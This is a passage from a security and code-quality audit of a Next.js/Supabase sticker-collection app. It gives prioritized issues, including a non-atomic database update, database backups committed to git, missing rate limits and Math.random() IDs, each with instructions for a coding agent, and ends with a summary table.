> 5. Apply to all 5 edge functions: `receive-inbound-email`, `send-corporate-email`, `send-email-notification`, `send-push-notification`, `send-user-summary-email`

---

### 19. Non-Atomic `setActiveCollection` — Race Condition
**Priority: P2 — MEDIUM**

In [ProfilePage.tsx](file:///c:/Users/dsalv/Projects/cromos-web/src/components/ProfilePage.tsx#L330-L360), `setActiveCollection` first sets ALL collections inactive, then sets one active. If the second call fails, ALL collections are inactive.

**Summary fix:** Use a single RPC that atomically swaps the active collection.

> **Agent Prompt:**
>
> **Context:** The current `setActiveCollection` function performs two sequential Supabase calls: (1) `UPDATE user_collections SET is_active = false WHERE user_id = ?` (deactivate ALL), then (2) `UPDATE user_collections SET is_active = true WHERE user_id = ? AND collection_id = ?` (activate the selected one). If call 1 succeeds but call 2 fails (network timeout, RLS error, database constraint), the user ends up with NO active collection. Since the app's core features (sticker tracking, trades, marketplace) depend on having an active collection, this leaves the user in a broken state where they can't use the app until they manually re-activate a collection (if the UI even allows it in that state). The fix wraps both operations in a PostgreSQL function, which runs atomically: if the second statement fails, the first is rolled back too. This is the same pattern as issue #4 — client-side multi-step mutations that should be server-side transactions.
>
> 1. Create a Supabase migration with an RPC `set_active_collection(p_user_id UUID, p_collection_id INT)` that:
>    - In a single transaction, sets all `user_collections.is_active = false` for the user
>    - Then sets the target collection's `is_active = true`
> 2. In `src/components/ProfilePage.tsx`, replace the `setActiveCollection` function (lines 330-360) with a single `supabase.rpc('set_active_collection', ...)` call

---

### 20. Stale Root-Level Documentation Files
**Priority: P3 — LOW**

Multiple root-level markdown files appear to be stale artifacts from past development:
- `DARK_MODE_IMPLEMENTATION_PLAN.md` (30KB)
- `DESIGN_ANALYSIS_REPORT.md` (30KB)
- `IMPLEMENTATION_PROMPT.txt` / `PHASE2` / `PHASE3`
- `NOTIFICATION_SETTINGS_FIX_IMPLEMENTED.md`
- `NOTIFICATION_SETTINGS_TEST_REPORT.md`
- `PERFORMANCE_REVIEW.md`
- Various `.sql` diagnostic files at root

**Summary fix:** Move to `docs/archive/` or delete.

> **Agent Prompt:**
>
> **Context:** These files are artifacts from previous development sessions — implementation plans, design reports, AI prompts, and diagnostic SQL queries that were useful at the time but are no longer actively maintained. They clutter the root directory (which should only contain config files and the README), make `ls` output noisy, and can mislead new contributors who might think they're current documentation. The SQL diagnostic files (`diagnose_chat_access.sql`, `diagnose_rating_triggers.sql`) contain raw queries that reference production tables and could be accidentally executed against the wrong database. The backup files (`backup.sql` at 8.7MB) shouldn't be in source control at all — they bloat the repo and potentially contain sensitive production data. Moving documentation to `docs/archive/` preserves it for reference while keeping the root clean. The SQL and backup files should be deleted and `.gitignore`d to prevent re-addition.
>
> 1. Create a `docs/archive/` directory
> 2. Move these files to `docs/archive/`:
>    - `DARK_MODE_IMPLEMENTATION_PLAN.md`
>    - `DESIGN_ANALYSIS_REPORT.md`
>    - `IMPLEMENTATION_PROMPT.txt`, `IMPLEMENTATION_PROMPT_PHASE2.txt`, `IMPLEMENTATION_PROMPT_PHASE3.txt`
>    - `NOTIFICATION_SETTINGS_FIX_IMPLEMENTED.md`
>    - `NOTIFICATION_SETTINGS_TEST_REPORT.md`
>    - `PERFORMANCE_REVIEW.md`
> 3. Delete these root-level SQL diagnostic files (they contain production queries that shouldn't be in source):
>    - `check_all_rating_triggers.sql`
>    - `diagnose_chat_access.sql`
>    - `diagnose_rating_triggers.sql`
> 4. Delete `backup.sql`, `backup.sql.gpg`, `backup_fixed.sql` — database backups should never be in git
> 5. Update `.gitignore` to exclude `*.sql` at root and `backup*` files

---

### 21. `Supabase.getPublicUrl()` Called Per-Item in Loops
**Priority: P2 — MEDIUM**

In [CollectionPage.tsx](file:///c:/Users/dsalv/Projects/cromos-web/src/components/CollectionPage.tsx#L195-L201), `resolvePublicUrl()` calls `supabase.storage.from('sticker-images').getPublicUrl(path)` inside a `.map()` loop for every sticker. While `getPublicUrl` is synchronous (it constructs a URL string), the pattern is inefficient and obscures intent.

**Summary fix:** Construct the base URL once and concatenate paths.

> **Agent Prompt:**
>
> **Context:** `supabase.storage.from('bucket').getPublicUrl(path)` doesn't actually make an HTTP request — it constructs a URL string from the Supabase project URL + bucket name + path. However, calling it inside a `.map()` loop for every sticker (potentially hundreds) means: (1) creating a new Storage client instance reference on each iteration, (2) running the URL construction logic repeatedly when it always produces `${SUPABASE_URL}/storage/v1/object/public/sticker-images/${path}`, and (3) obscuring to future readers that this is just string concatenation (it looks like an API call). The fix is to compute the base URL once before the loop and use simple string concatenation inside the loop. This is cleaner, marginally faster, and — most importantly — makes it obvious to anyone reading the code that we're just building URLs, not making API calls. It's a readability and maintainability improvement first, performance second.
>
> In `src/components/CollectionPage.tsx`, refactor the `resolvePublicUrl` function (lines 195-201):
> 1. Before the `.map()`, compute the base URL once: `const baseUrl = supabase.storage.from('sticker-images').getPublicUrl('').data.publicUrl`
> 2. Replace `resolvePublicUrl(path)` with a simple string concatenation: `path ? baseUrl + '/' + path : null`
> 3. This is cleaner and makes the intent explicit

---

### 22. Missing `<Suspense>` Boundaries for Lazy-Loaded Content
**Priority: P3 — LOW**

The app uses several dynamic imports (e.g., Capacitor modules in `page.tsx`) but doesn't wrap client-side lazy-loaded components with `<Suspense>` boundaries. This can cause waterfall loading and poor UX.

**Summary fix:** Add Suspense boundaries around heavy client components like dashboard and marketplace.

> **Agent Prompt:**
>
> **Context:** React's `<Suspense>` component provides a declarative loading state for components that aren't ready to render yet. Without it, when a lazy-loaded component (via `React.lazy()` or `next/dynamic`) is loading, React either shows nothing or throws an error, depending on the version. With `<Suspense fallback={<Skeleton />}>`, users see a meaningful loading placeholder (a skeleton screen) instead of a blank page or spinner. In this codebase, large components like `UserDashboard`, `LandingPage`, `CollectionPage`, and `ProfilePage` are imported synchronously, meaning they're included in the main JS bundle even when they might not be rendered (e.g., `LandingPage` is only shown to unauthenticated users, but authenticated users still download its code). Lazy-loading with Suspense splits them into separate chunks that are downloaded only when needed, reducing the initial bundle size and improving Time to Interactive (TTI). This is especially important for the Capacitor Android app where network speed may be limited.
>
> 1. In `src/app/page.tsx`, lazy-import heavy components:
>    ```tsx
>    const UserDashboard = lazy(() => import('@/components/dashboard/UserDashboard'));
>    const LandingPage = lazy(() => import('@/components/home/LandingPage'));
>    ```
> 2. Wrap them in `<Suspense fallback={<LoadingSkeleton />}>` where `LoadingSkeleton` provides a meaningful loading UI
> 3. Apply the same pattern to other large page-level components like CollectionPage and ProfilePage

---

### 23. Database Backups in Git History
**Priority: P1 — HIGH (historical)**

`backup.sql` (8.7MB), `backup.sql.gpg` (1.1MB), and `backup_fixed.sql` (4.3MB) are committed to the repository. Even after deletion, they remain in git history, bloating the repo and potentially exposing production data.

**Summary fix:** Delete files, add to `.gitignore`, and consider using `git filter-repo` to purge from history.

> **Agent Prompt:**
>
> **Context:** These files are full database backups that appear to have been accidentally committed. `backup.sql` at 8.7MB contains raw SQL dumps that likely include user data (emails, profiles, collection data), which creates a GDPR and privacy concern — anyone who clones the repo (or has historical access) can see this data. Even after deleting the files from the working directory, they persist forever in git's object store — `git log --all --full-history -- backup.sql` would show their content. The `.gpg` file is an encrypted backup, which is less concerning but still adds unnecessary bloat. Combined, these files add ~14MB to every clone of the repository, which is especially impactful for CI/CD pipelines that clone the repo on every build. The immediate fix (delete + .gitignore) prevents re-occurrence. The optional `git filter-repo` step fully purges them from history, but this rewrites all commit SHAs and requires all team members to re-clone — hence it's marked as optional and requires coordination.
>
> 1. Add to `.gitignore`:
>    ```
>    backup*.sql
>    backup*.sql.gpg
>    *.sql.gpg
>    ```
> 2. Delete: `backup.sql`, `backup.sql.gpg`, `backup_fixed.sql`
> 3. Commit the deletion
> 4. Optionally (destructive, requires force push): Run `git filter-repo --invert-paths --path backup.sql --path backup.sql.gpg --path backup_fixed.sql` to remove from entire git history. Warn the user this rewrites history and requires team coordination.

---

## 🔵 Low — Suggestions & Improvements

### 24. No Rate Limiting on Admin API Routes
**Priority: P3 — LOW**

The `/api/admin/force-reset` and `/api/admin/delete-user` routes have no rate limiting. An authenticated admin (or compromised session) could spam destructive operations.

> **Agent Prompt:**
>
> **Context:** These admin routes perform irreversible, high-impact operations: `force-reset` generates a password reset link and sends it via email, and `delete-user` permanently purges a user's data and auth record. While they require admin authentication, there's no rate limiting — a compromised admin session (e.g., via session hijacking or XSS) could call these endpoints hundreds of times per second, mass-resetting or deleting users. Even in non-malicious scenarios, a double-click bug in the admin UI could fire two delete requests. Rate limiting adds a safety net: even if an attacker has admin access, they can't cause damage faster than the rate limit allows, giving time for detection and response. The simplest approach is a per-IP or per-user token bucket rate limiter, either in-memory (simple but resets on redeploy) or using Vercel's edge rate limiting package.
>
> Add a simple in-memory rate limiter or use Vercel's `@vercel/edge-rate-limit` for `/api/admin/*` routes. Alternatively, add a `lastActionAt` check in the audit log to prevent rapid successive admin actions.

---

### 25. Missing Error Boundaries at Route Level
**Priority: P3 — LOW**

While there's a root `ErrorBoundary` in layout and `error.tsx` / `global-error.tsx`, individual route groups don't have error boundaries. A crash in the marketplace page takes down the whole app instead of showing a localized error.

> **Agent Prompt:**
>
> **Context:** Next.js App Router supports per-route `error.tsx` files that act as React Error Boundaries for that specific route segment. The app has a root-level `error.tsx` and `global-error.tsx`, which catch errors at the top level, but this means ANY uncaught error in ANY component resets the entire page to the error state — losing navigation, user context, and scroll position. If the marketplace listing detail page crashes (e.g., a null reference on an optional field), the user sees a full-page error instead of just a "something went wrong" card in the marketplace content area with the navigation still working. By adding `error.tsx` to key route directories, errors are isolated to the affected segment while the rest of the app (header, navigation, footer) remains functional. This is especially important for the marketplace and chat pages where data from other users (which may have unexpected formats) is displayed.
>
> Add `error.tsx` files to key route groups: `src/app/marketplace/error.tsx`, `src/app/mis-plantillas/error.tsx`, `src/app/chats/error.tsx`, `src/app/admin/error.tsx`. Each should show a user-friendly "algo salió mal" message with a retry button, styled consistently with the app.

---

### 26. `generateId()` Uses `Math.random()` — Not Cryptographically Secure
**Priority: P3 — LOW**

[src/lib/utils.ts](file:///c:/Users/dsalv/Projects/cromos-web/src/lib/utils.ts#L79-L81) uses `Math.random()` for ID generation. If used for anything security-sensitive, this is predictable.

> **Agent Prompt:**
>
> **Context:** `Math.random()` uses a pseudo-random number generator (PRNG) that is NOT cryptographically secure — given enough samples, an attacker can predict future outputs. If `generateId()` is used for client-side UI keys (e.g., list item keys, temporary DOM IDs), this is fine. But if it's used for tokens, nonces, session identifiers, or anything that provides security guarantees, it's exploitable. `crypto.randomUUID()` uses the OS's cryptographic random source and produces a standard UUID v4, which is both unpredictable and has a negligible collision probability. It's available in all modern browsers and Node.js 16+. The fix is a one-liner replacement. Before making the change, check all call sites of `generateId()` to understand the security context — if it's only used for UI purposes, this is low-urgency but still good hygiene.
>
> In `src/lib/utils.ts`, replace the `generateId()` function (lines 79-81) with `crypto.randomUUID()` or `crypto.getRandomValues()` if a shorter ID is needed. Check all call sites to see if any use it for security-sensitive purposes.

---

## Summary Table

| # | Issue | Priority | Category |
|---|-------|----------|----------|
| 1 | ~~No Next.js middleware~~ | ✅ Resolved | Security |
| 2 | XSS in email templates | 🔴 P0 | Security |
| 3 | `getSession()` instead of `getUser()` | 🔴 P0 | Security |
| 4 | Non-atomic multi-table deletions | 🔴 P1 | Data Integrity |
| 5 | Manual database types (no auto-gen) | 🟠 P1 | Architecture |
| 6 | Deprecated RPC still in use | 🟠 P1 | Tech Debt |
| 7 | N+1 query in ProfilePage | 🟠 P1 | Performance |
| 8 | Root page.tsx is client-only (no SSR) | 🟠 P1 | SEO/Perf |
| 9 | Duplicate server client boilerplate | 🟠 P2 | Maintainability |
| 10 | Duplicate type definitions | 🟡 P2 | Code Quality |
| 11 | Legacy/dead exports | 🟡 P2 | Tech Debt |
| 12 | Redundant admin check in AdminGuard | 🟡 P2 | Performance |
| 13 | Encoding corruption in Spanish strings | 🟡 P2 | Bug |
| 14 | Locale mismatch (English dates) | 🟡 P2 | UX |
| 15 | Dual ESLint config files | 🟡 P3 | Tooling |
| 16 | 24+ `@ts-ignore` suppressions | 🟡 P2 | Code Quality |
| 17 | Test/debug pages in production | 🟡 P2 | Security/Hygiene |
| 18 | Deprecated Deno imports in edge functions | 🟡 P2 | Tech Debt |
| 19 | Non-atomic setActiveCollection | 🟡 P2 | Data Integrity |
| 20 | Stale root-level docs | 🟡 P3 | Hygiene |
| 21 | getPublicUrl called per-item in loops | 🟡 P2 | Performance |
| 22 | Missing Suspense boundaries | 🔵 P3 | Performance |
| 23 | Database backups in git | 🟠 P1 | Security |
| 24 | No rate limiting on admin routes | 🔵 P3 | Security |
| 25 | Missing route-level error boundaries | 🔵 P3 | Resilience |
| 26 | Math.random() for ID generation | 🔵 P3 | Security |
